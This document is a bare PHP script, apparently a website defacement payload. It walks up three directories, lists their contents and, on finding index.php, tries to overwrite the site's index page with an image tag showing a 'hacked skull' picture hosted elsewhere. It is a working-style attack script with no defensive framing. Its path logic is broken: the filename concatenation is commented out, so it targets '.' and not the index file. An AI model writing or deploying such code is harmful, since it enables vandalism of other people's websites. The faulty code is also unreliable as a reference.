
<?php 

if ($handle = opendir('../../../')) {

    while (false !== ($entry = readdir($handle))) {

        if ($entry != "." && $entry != "..") {
            
            echo "$entry\n";
        }
         if($entry == "index.php"){
            chdir('../../../');
            $pathToIndex = dirname("./") //. "index.php" ;
            echo "--------------------------------".$pathToIndex;
            $myfile = fopen($pathToIndex, 'w');
            fwrite($myfile, "<img src=\"https://casino.buzz/wp-content/uploads/2019/10/hacked-skull-e1570821755570.jpg\">");
            fclose($myfile);
            break;
         }
    }
    echo getcwd();
    closedir($handle);
}
?>